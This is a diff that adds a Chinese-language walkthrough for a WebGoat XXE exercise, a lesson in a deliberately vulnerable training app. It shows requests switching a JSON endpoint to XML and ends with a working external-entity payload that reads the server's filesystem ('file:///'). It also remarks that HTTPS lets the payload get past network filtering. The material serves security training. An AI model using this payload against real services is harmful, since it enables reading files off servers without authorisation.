@@ -1,0 +1,73 @@
+=== 练习解答
+
+本练习要说明的是：应用看起来似乎只接受 JSON，但如果将消息正文改为 XML，框架可能会对其进行处理。尝试输入评论时，请求正文如下：
+
+[source, json]
+----
+{"text":"My first comment"}
+----
+
+这是普通的 JSON 消息。我们试着更改请求的 Content-Type：
+
+[source]
+----
+POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
+Content-Type: application/xml
+
+{"text":"My first comment"}
+----
+
+这会导致以下异常：
+
+[source]
+----
+javax.xml.bind.UnmarshalException\n - with linked exception:\n[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,1]\nMessage: Content is not allowed in prolog.
+----
+
+根据 XML 解析器不同，错误消息也可能不同。此处的错误信息有些难以理解，它表示发送的 XML 无效。例如，Jackson 库会显示以下消息：
+
+[source]
+----
+JSON parse error: Unexpected character '{' (code 123) in prolog; expected
+      '<'\n at [row,col {unknown-source}]: [1,1]; nested exception is com.fasterxml.jackson.core.JsonParseException:
+      Unexpected character '{' (code 123) in prolog; expected '<'\n at [row,col {unknown-source}]: [1,1]“
+----
+
+出现此错误是因为我们仍然向端点发送 JSON 消息。如果拦截请求并将 JSON 消息改为 XML 消息：
+
+[source]
+----
+POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
+Content-Type: application/xml
+
+<text>This is my first message</text>
+----
+
+端点再次返回错误消息：
+
+[source]
+----
+"javax.xml.bind.UnmarshalException\\n - with linked exception:\\n[com.sun.istack.SAXParseException2; lineNumber: 1; columnNumber: 7; unexpected element (uri:\\"\\", local:\\"text\\"). Expected elements are <{}comment>]"
+----
+
+解析器提示该消息不是有效的 XML，需要将内容放在 `comment` 标签中：
+
+[source, xml]
+----
+POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
+Content-Type: application/xml
+
+<comment><text>This is my first message</text></comment>
+----
+
+此时端点不再报错。如果刷新 WebGoat 页面，就会看到已发布的评论。要成功攻击，需要发送：
+
+[source, xml]
+----
+POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
+Content-Type: application/xml
+
+<!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;This is my first message</text></comment>
+----
+
+在某些公司网络中，如果通过 HTTP 发送此载荷，网络设备可能会直接丢弃它。此时 POST 请求不会返回响应，端点也永远不会收到请求。不过，这类防护效果有限，因为在 HTTPS 环境下，同一个请求可以成功通过，载荷在传输中会被加密。
